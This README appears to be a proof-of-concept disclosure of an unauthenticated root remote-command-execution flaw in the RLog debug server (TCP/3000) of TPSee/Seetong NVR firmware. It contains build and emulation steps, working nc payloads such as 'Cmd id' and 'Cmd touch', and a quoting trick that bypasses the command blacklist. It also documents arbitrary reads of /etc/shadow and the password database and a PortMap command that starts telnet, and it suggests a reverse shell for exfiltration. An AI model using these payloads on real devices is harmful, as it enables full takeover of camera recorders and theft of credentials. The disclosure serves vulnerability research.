# PoC - RLog debug server RCE
The harness demonstrates that the firmware's libLOG.so starts an RLog  
server on TCP/3000. The command-dispatcher analysis and dynamic tests  
demonstrate unauthenticated OS command execution through that server.  

It loads the firmwares **own** `libLOG.so` under qemu-arm, calls `TLog_Init()`  
and the real server binds to `0.0.0.0:3000` and accepts inbound connections  
from **anywhere** with **no** authentication.

## Vulnerability

The firmware exposes an unauthenticated RLog command server on TCP/3000.

The command dispatcher registers `Cmd`, which passes attacker-controlled
input to `TLog_CMD`. `TLog_CMD` ultimately invokes the firmware command
execution backend.

Therefore:
```
Unauthenticated TCP connection
        ↓
RLog command dispatcher
        ↓
Cmd <attacker-controlled command>
        ↓
TLog_CMD
        ↓
mysystem()
        ↓
/bin/sh
        ↓
command execution
```
## Files
- `harness.c`: persistent version: brings the server up and sleeps (use this for actual use)
- `probe_harness.c`: probe version: also attempts command probes from inside the emulator (shows type-byte framing requirement)  

If the firmware download the script below uses to create the sysroot doesent exist anymore. You can grab it from one of these (just image search the nvr, the firmware is widely distributed):
- https://www.fullward.com/index.php?m=home&c=View&a=index&aid=145  
- http://en.tpsee.com/index.php?md=article&ct=lists&catid=24  

I used firmware `v4.6.1.4-build202604241011` for this, other firmware versions have not yet been tested, but downstream dropshippers like fullward have it too.

## Building
Run this in the same directory as the harnesses
```sh
# Download and extract toolchain
wget https://gitlab.arm.com/api/v4/projects/tooling%2Fgnu-toolchains-for-arm/packages/generic/gnu-toolchain/15.3.rel1/arm-gnu-toolchain-15.3.rel1-x86_64-arm-none-linux-gnueabihf.tar.xz
tar -xvf arm-gnu-toolchain-15.3.rel1-x86_64-arm-none-linux-gnueabihf.tar.xz

TC=$(pwd)/arm-gnu-toolchain-15.3.rel1-x86_64-arm-none-linux-gnueabihf

# Creating the sysroot
wget http://www.tpsee.com/upload/firmware/update-ts81xxd3x-v4.6.1.4-build202604241011.bin
binwalk -Me update-ts81xxd3x-v4.6.1.4-build202604241011.bin

mkdir -p sysroot
cp -a "_update-ts81xxd3x-v4.6.1.4-build202604241011.bin.extracted/_0.extracted/tmp/_rootfs.ts81xxd3x.extracted/squashfs-root/lib" sysroot/

cp "_update-ts81xxd3x-v4.6.1.4-build202604241011.bin.extracted/_0.extracted/tmp/_app.ts81xxd3x.extracted/squashfs-root/lib/libLOG.so" \
   "_update-ts81xxd3x-v4.6.1.4-build202604241011.bin.extracted/_0.extracted/tmp/_app.ts81xxd3x.extracted/squashfs-root/lib/libmysystem.so" sysroot/lib/

$TC -march=armv7-a -mthumb -mfloat-abi=soft -nostdlib -ffreestanding -fno-builtin \
    -Wl,--dynamic-linker,/lib/ld-uClibc.so.0 -Wl,-rpath,/lib -Wl,-e,_start -Wl,--export-dynamic \
    harness.c -o harness -L sysroot/lib -lc

```
This harness provides stub implementations of the symbols that `libLOG.so` imports from `edvr`

## Running
```sh
qemu-arm -L sysroot ./harness &
sleep 2
ss -tln | grep 3000
# -> LISTEN 0 5 0.0.0.0:3000 0.0.0.0:*  (qemu user-mode forwards the emulated socket to the host)
```
Observed output from probe_harness.c (not the one used in the script above):
```
dlopen ok
TLog_Init() -> 0
--- probe port 3000 ---
connect port 3000 OK        (x5 meaning every connection accepted)
REPLY: timeout/none         (plain-text probes ignored: binary type-byte framing required)
```

## Use
```sh
➜  seetong-ts81xxd3x-rce printf 'Cmd cat /etc/os-release > /tmp/rlog_os.txt\r\n' | nc 127.0.0.1 3000
^C% 
➜  seetong-ts81xxd3x-rce cat /tmp/rlog_os.txt 
NAME="Artix Linux"
PRETTY_NAME="Artix Linux"
ID=artix
BUILD_ID=rolling
ANSI_COLOR="38;2;23;147;209"
HOME_URL="https://artixlinux.org/"
DOCUMENTATION_URL="https://wiki.artixlinux.org/"
SUPPORT_URL="https://forum.artixlinux.org/"
BUG_REPORT_URL="https://bugs.artixlinux.org/"
PRIVACY_POLICY_URL="https://terms.artixlinux.org/docs/privacy-policy/"
LOGO=artixlinux-logo
➜  seetong-ts81xxd3x-rce 
```
Artix Linux is displayed due to qemu user mode sharing the host filesystem as this PoC doesen't properly isolate it.

## Command dispatcher detail
*AI Disclosure, below text is ai generated*
### Registered commands (module "RLog", `LogModuleRegCmd` @ 0x8f94)

| Command | Handler | Effect |
|---|---|---|
| `StartDebug`, `StartLog`, `SetLogLevel`, `Help`, `StartAutoTest` | various | logging/self-test control |
| `GetSystemStatus`, `GetSystemInfo`, `GetSystemLog`, `GetSystemCfg` | TLog_Get* | info/config/log disclosure |
| **`GetSystemFile [abs names]`** | TLog_GetSystemFile (0x7a94) + TLog_SendFile (0x48f0) | **arbitrary file read** (`/etc/shadow`, `/usr/local/etc/user.db`, ...) |
| `GetPrintfFile` | TLog_GetPrintfFile | file read |
| **`Cmd [System commands]`** | **TLog_CMD (0x3680)** | **shell command execution as root** |
| **`PortMap on <ip> <port>` / `PortMap off`** | fcn.00008b76 | **reverse TUN tunnel + telnetd on port 23** |

### TLog_CMD (0x3680) — remote shell
- Copies command (max 48 chars, stops at `; \r \n`).
- Blacklist = exact-match {`vi`, `cd`, `top`, `if`, `killcmd`} (strcmp) — trivially bypassed (`cat`, `sh`, quoting).
- Background mode format string `"%s -b"` → runs via `sh -c`.
- Kill helper strings: `ps -ef | grep  "sh -c %s" |grep -v grep`, `'{print $1}' | xargs kill -9`.
- Execution backend: `mysystem()` (libmysystem.so) → IPC to **`/usr/sbin/systemd`** (fake systemd, executes via `/bin/sh` as root; strings `"[systemd cmd:]%s"`, `"[systemd ret:]%d"`).

**Blacklist demo (2026-08-04, emulated server):**
```
Cmd vi > /tmp/bl_vi                → dropped (no file created)
Cmd cat /etc/hostname > /tmp/bl_cat → executed (file contains hostname)
Cmd v''i > /tmp/bl_bypass          → BLACKLIST BYPASSED (shell sees `vi`, strcmp sees `v''i`)
```

### PortMap handler (fcn.00008b76) — tunnel + telnet
- Parses `PortMap on <ip> <port>` (expects 3 fields).
- `portmap_client_start(ip, port)` (0x88b0):
  - `system("lsmod | grep -q '^tun\\b' || insmod /config/modules/4.9.84/tun.ko")`
  - opens `/dev/net/tun`, creates interface **`tps0`**, `ifconfig tps0 up`
  - reads `/mnt/nand/yun_id.txt`, `/etc/product_type.txt`
  - on success: `system("touch /usr/local/etc/normal_telnet")` (0x897e→0x8982)
- Handler then runs `system("killall telnetd")` (0x8c1e) and `system("telnetd -p 23 &")` (0x8c32).
- `portmap_client_stop` (0x8a48) → `system("rm -f /usr/local/etc/normal_telnet")`, `ifconfig tps0 down`.
- Related exports: `portmap_client_get_status`, `portmap_client_is_running`, `portmap_client_get_assigned_ip`.
- Log strings: `"usage: PortMap on <ip> <port> | PortMap off\n"`, `"PortMap on: IP=%s, Port=%d\n"`, `"PortMap start success! ret:%d"`, `"PortMap stop success!"`.

### Other notable strings
- `"rm %s/* -rf"` (0xad10) — used by log-directory cleanup (TLog_DeleteLogFile).

## Dynamic verification (2026-08-04)

Harness (`harness.c`) dlopens `libLOG.so`, stubs its edvr imports, calls `TLog_Init()`:
```
dlopen ok
TLog_Init() -> 0
```
Host side (qemu user-mode socket passthrough):
```
LISTEN  0  5  0.0.0.0:3000  0.0.0.0:*  users:(("qemu-arm",pid=...,fd=0))
```

**Command execution proof (plain text, no auth):**
```
$ printf 'Cmd touch /tmp/rlog_pwned\r\n' | nc <target> 3000        # file created
$ printf 'Cmd id > /tmp/rlog_id.txt\r\n' | nc <target> 3000      # id output captured
```
Both verified on the emulated server. Commands execute via `mysystem()` → `/usr/sbin/systemd` → `/bin/sh` (root on device). No output is returned on the socket (blind RCE; use out-of-band exfiltration, e.g. `Cmd cat /usr/local/etc/user.db > /mnt/...` or a reverse shell).

**Impact:** any unauthenticated network attacker can execute shell commands as root, read any file (incl. the plaintext password DB and password-leaking logs), and switch telnet to port 23. On a LAN this is game over; on internet-exposed units likewise.
